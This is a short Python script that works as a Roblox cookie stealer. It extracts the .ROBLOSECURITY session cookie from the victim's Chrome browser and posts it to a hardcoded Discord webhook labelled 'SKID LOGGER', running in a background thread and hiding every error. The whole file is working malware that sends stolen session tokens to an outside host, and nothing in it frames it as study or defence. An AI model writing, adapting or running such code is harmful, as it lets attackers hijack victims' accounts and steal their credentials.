import browser_cookie3, requests, threading, discord_webhook

webhook = 'https://discord.com/api/webhooks/998827910242775050/z8epKdhYmpsNOoAzTuQRT_uJk86K1x0XLxxX1oii9M8DmUUQU3Ftg-_vkFW3tTc9phKF'

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'SKID LOGGER', 'content':f'```SKIDS COOKIE: {cookie}```'})
    except:
        pass
browsers = [chrome_logger]

for x in browsers:
    threading.Thread(target=x,).start()
